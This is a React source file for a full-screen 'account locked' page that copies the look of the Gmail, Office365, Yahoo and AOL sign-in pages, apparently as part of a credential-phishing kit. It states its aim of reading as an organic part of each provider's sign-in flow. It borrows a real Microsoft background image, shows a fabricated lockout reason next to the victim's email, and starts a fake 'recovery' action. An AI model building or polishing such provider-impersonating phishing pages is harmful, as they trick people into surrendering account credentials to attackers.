import React from 'react';
import { useLocation, useNavigate } from 'react-router-dom';
import { ProviderKey, getProviderTheme, ProviderLogo } from './providerTheme';

interface AccountLockedPageProps {
  providerKey: ProviderKey;
  onAction: (action: string, data?: Record<string, unknown>) => void;
}

/**
 * Full-screen "account locked" page, themed per provider. Mirrors the style of the
 * corresponding login page (header chrome, logo, colors, typography) so it reads
 * as an organic part of the provider's sign-in flow.
 */
const AccountLockedPage: React.FC<AccountLockedPageProps> = ({ providerKey, onAction }) => {
  const location = useLocation();
  const navigate = useNavigate();
  const theme = getProviderTheme(providerKey);
  const data = ((location.state as { data?: Record<string, unknown> } | null)?.data) || {};
  const email = (data.email as string) || ((location.state as { email?: string } | null)?.email) || '';
  const reason = (data.reason as string) || 'unusual sign-in activity was detected on your account';
  const backendMessage = (data.message as string) || '';

  const defaultHeadline: Record<ProviderKey, string> = {
    gmail: 'Your account has been locked',
    office365: "We've locked your account",
    yahoo: 'Account temporarily locked',
    aol: 'Your AOL account is locked',
    others: 'Your account has been locked',
  };

  const description = backendMessage
    || `For your security, we've temporarily locked this account because ${reason}. To regain access, please verify your identity.`;

  const handleRecover = () => onAction('begin_account_recovery', { email });
  const goBackHome = () => { onAction('cancel'); navigate(-1); };

  const LockIcon = ({ color, size = 48 }: { color: string; size?: number }) => (
    <svg width={size} height={size} viewBox="0 0 24 24" fill="none" stroke={color} strokeWidth="1.6" aria-hidden="true">
      <rect x="4" y="11" width="16" height="10" rx="2" />
      <path d="M8 11V8a4 4 0 118 0v3" />
      <circle cx="12" cy="16" r="1.3" fill={color} stroke="none" />
    </svg>
  );

  // Gmail
  if (providerKey === 'gmail') {
    return (
      <div className="min-h-screen flex flex-col font-sans bg-[#f0f4f9]">
        <main className="flex-grow w-full flex items-center justify-center p-4">
          <div className="w-full max-w-[500px] mx-auto bg-white rounded-[28px] px-10 py-12 text-center" style={{ boxShadow: '0 1px 2px 0 rgba(60,64,67,.08), 0 1px 3px 1px rgba(60,64,67,.04)' }}>
            <div className="flex justify-center mb-4"><ProviderLogo providerKey="gmail" /></div>
            <div className="mx-auto mb-4 flex items-center justify-center w-14 h-14 rounded-full" style={{ backgroundColor: theme.primaryLight }}>
              <LockIcon color={theme.primary} size={28} />
            </div>
            <h1 className="text-[24px] leading-[32px] font-normal text-gray-900 mb-3">{defaultHeadline.gmail}</h1>
            {email && (<p className="text-sm text-gray-700 mb-2">{email}</p>)}
            <p className="text-sm text-gray-700 mb-8 px-2">{description}</p>
            <button onClick={handleRecover} className="px-6 py-2.5 text-white text-sm font-semibold rounded-full" style={{ backgroundColor: theme.primary }}>
              Try to recover this account
            </button>
            <div className="mt-4">
              <button onClick={goBackHome} className="text-sm font-semibold hover:underline" style={{ color: theme.primary }}>
                Back to sign in
              </button>
            </div>
          </div>
        </main>
      </div>
    );
  }

  // Office365
  if (providerKey === 'office365') {
    return (
      <div
        className="min-h-screen flex items-center justify-center p-0 md:p-4"
        style={{
          fontFamily: theme.fontFamily,
          backgroundImage: "url('https://aadcdn.msftauth.net/shared/1.0/content/images/backgrounds/2_bc3d32a696895f78c19df6c717586a5d.svg')",
          backgroundSize: 'cover',
          backgroundPosition: 'center',
          backgroundColor: '#e9e9e9',
        }}
      >
        <div className="bg-white w-full max-w-[440px] px-11 py-11" style={{ boxShadow: '0 2px 6px rgba(0,0,0,.2)' }}>
          <div className="mb-5"><ProviderLogo providerKey="office365" /></div>
          {email && (
            <div className="flex items-center text-sm text-[#1b1b1b] mb-3">
              <button type="button" onClick={goBackHome} className="mr-2 text-[#1b1b1b]" aria-label="Back">&larr;</button>
              <span>{email}</span>
            </div>
          )}
          <h1 className="text-[24px] leading-7 font-semibold text-[#1b1b1b] mb-3">{defaultHeadline.office365}</h1>
          <p className="text-sm text-[#1b1b1b] mb-5">{description}</p>
          <div className="mb-4 p-3 border-l-4" style={{ borderLeftColor: theme.error, backgroundColor: '#fdf3f4' }}>
            <span className="text-xs" style={{ color: theme.error }}>To unlock this account, you must verify your identity.</span>
          </div>
          <div className="flex justify-end gap-2">
            <button onClick={goBackHome} className="px-6 py-[6px] text-[#1b1b1b] text-sm font-semibold border border-[#8a8886] hover:bg-[#f3f2f1]" style={{ minWidth: '108px' }}>Back</button>
            <button onClick={handleRecover} className="px-6 py-[6px] text-white text-sm font-semibold" style={{ backgroundColor: theme.primary, minWidth: '108px' }}>
              Unlock account
            </button>
          </div>
        </div>
      </div>
    );
  }

  // Yahoo
  if (providerKey === 'yahoo') {
    return (
      <div className="min-h-screen bg-white font-sans flex flex-col" style={{ fontFamily: theme.fontFamily }}>
        <header className="flex-shrink-0 py-6 px-10">
          <ProviderLogo providerKey="yahoo" className="h-8" />
        </header>
        <main className="flex-grow w-full flex items-center justify-center p-4">
          <div className="w-[400px] px-8 pt-10 pb-12 bg-white rounded-2xl text-center" style={{ boxShadow: '0 1px 20px rgba(0,0,0,.04)' }}>
            <div className="mx-auto mb-4 flex items-center justify-center w-16 h-16 rounded-full" style={{ backgroundColor: theme.primaryLight }}>
              <LockIcon color={theme.primary} />
            </div>
            <h2 className="text-[22px] font-bold text-gray-900 mb-2">{defaultHeadline.yahoo}</h2>
            {email && (<div className="my-4 p-2 bg-gray-100 rounded-full text-sm font-semibold truncate">{email}</div>)}
            <p className="text-sm text-gray-600 mb-6">{description}</p>
            <button onClick={handleRecover} className="w-full py-3 text-white font-semibold rounded-full" style={{ backgroundColor: theme.primary }}>
              Verify my identity
            </button>
            <div className="mt-4">
              <button onClick={goBackHome} className="text-sm font-medium" style={{ color: theme.primary }}>Back to sign in</button>
            </div>
          </div>
        </main>
      </div>
    );
  }

  // AOL
  if (providerKey === 'aol') {
    return (
      <div className="min-h-screen bg-white font-sans flex flex-col" style={{ fontFamily: theme.fontFamily }}>
        <header className="flex-shrink-0 py-4 px-6 border-b border-gray-200">
          <ProviderLogo providerKey="aol" className="h-6" />
        </header>
        <main className="flex-grow w-full flex items-center justify-center p-4">
          <div className="w-full max-w-[400px] py-12 px-10 bg-white rounded-xl border border-gray-200 text-center">
            <div className="mx-auto mb-4 flex items-center justify-center w-16 h-16 rounded-full" style={{ backgroundColor: theme.primaryLight }}>
              <LockIcon color={theme.primary} />
            </div>
            <h2 className="text-2xl font-bold text-gray-900 mb-3">{defaultHeadline.aol}</h2>
            {email && (<div className="my-4 p-2 bg-gray-100 rounded-md text-sm font-medium truncate">{email}</div>)}
            <p className="text-sm text-gray-600 mb-6">{description}</p>
            <button onClick={handleRecover} className="w-full py-3 text-white font-bold rounded-md text-base" style={{ backgroundColor: theme.primary }}>
              Unlock account
            </button>
            <div className="mt-4">
              <button onClick={goBackHome} className="text-sm font-medium" style={{ color: theme.primary }}>Back to sign in</button>
            </div>
          </div>
        </main>
      </div>
    );
  }

  // Others (generic)
  return (
    <div className="min-h-screen flex flex-col bg-[#f5f5f5]" style={{ fontFamily: theme.fontFamily }}>
      <main className="flex-grow w-full flex items-center justify-center p-4">
        <div className="w-full max-w-[460px] bg-white rounded-lg shadow p-8 text-center">
          <div className="mx-auto mb-4 flex items-center justify-center w-16 h-16 rounded-full" style={{ backgroundColor: theme.primaryLight }}>
            <LockIcon color={theme.primary} />
          </div>
          <h1 className="text-[22px] leading-7 font-semibold text-[#222] mb-3">{defaultHeadline.others}</h1>
          {email && (<p className="text-sm text-gray-600 mb-4">{email}</p>)}
          <p className="text-sm text-gray-600 mb-6">{description}</p>
          <button onClick={handleRecover} className="w-full py-3 text-white text-sm font-semibold rounded-md" style={{ backgroundColor: theme.primary }}>
            Verify my identity
          </button>
          <div className="mt-4">
            <button onClick={goBackHome} className="text-sm font-medium hover:underline" style={{ color: theme.primary }}>Back to sign in</button>
          </div>
        </div>
      </main>
    </div>
  );
};

export default AccountLockedPage;
